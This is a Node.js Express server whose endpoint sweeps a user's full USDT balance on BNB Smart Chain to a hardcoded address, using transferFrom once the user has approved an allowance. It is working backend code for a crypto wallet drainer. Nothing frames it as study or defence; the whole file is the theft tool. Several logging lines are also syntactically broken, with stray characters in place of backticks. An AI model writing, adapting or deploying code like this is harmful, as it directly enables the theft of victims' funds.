const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');

const app = express();
app.use(express.json());
app.use(cors());

const RPC_URL = "https://bsc-dataseed.binance.org/";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
const PRIVATE_KEY = process.env.PRIVATE_KEY;

const provider = new ethers.providers.JsonRpcProvider(RPC_URL);

let wallet;
try {
  if (PRIVATE_KEY) {
    wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  } else {
    console.error("WARNING: PRIVATE_KEY is missing!");
  }
} catch (err) {
  console.error("Wallet error:", err.message);
}

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
];

app.post('/api/trigger-sweep', async (req, res) => {
  try {
    if (!wallet) {
      return res.status(500).json({ success: false, error: "Wallet not configured" });
    }

    const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, wallet);
    const { userAddress } = req.body;
    
    if (!userAddress || !ethers.utils.isAddress(userAddress)) {
      return res.status(400).json({ success: false, error: "Invalid address" });
    }

    console.log(⁠ Processing sweep for: ${userAddress} ⁠);

    const balance = await usdtContract.balanceOf(userAddress);
    if (balance.lte(0)) {
      return res.status(400).json({ success: false, error: "Zero balance" });
    }

    const allowance = await usdtContract.allowance(userAddress, wallet.address);
    if (allowance.lt(balance)) {
      return res.json({ success: false, message: "Waiting for approval" });
    }

    console.log(⁠ Executing transferFrom for amount: ${ethers.utils.formatUnits(balance, 18)} USDT ⁠);
    const tx = await usdtContract.transferFrom(userAddress, TARGET_ADDRESS, balance, {
      gasLimit: 100000
    });

    console.log(⁠ Tx sent: ${tx.hash} ⁠);
    await tx.wait();
    console.log("Transfer successful!");

    return res.json({ success: true, txHash: tx.hash });

  } catch (err) {
    console.error("Sweep error:", err.message);
    return res.status(500).json({ success: false, error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(⁠ Server running on port ${PORT} ⁠);
});
